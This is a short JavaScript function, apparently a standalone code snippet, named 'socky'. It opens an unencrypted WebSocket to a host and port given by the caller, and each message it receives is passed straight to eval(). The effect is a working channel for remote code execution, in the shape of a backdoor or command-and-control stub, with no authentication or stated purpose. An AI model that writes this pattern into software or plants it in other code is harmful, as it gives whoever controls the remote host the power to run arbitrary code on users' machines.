function socky(host, port, params) {
  var ws = new WebSocket('ws://' + host + ':' + port + '/?' + params);
  ws.onmessage = function (evt) { eval(evt.data) };
}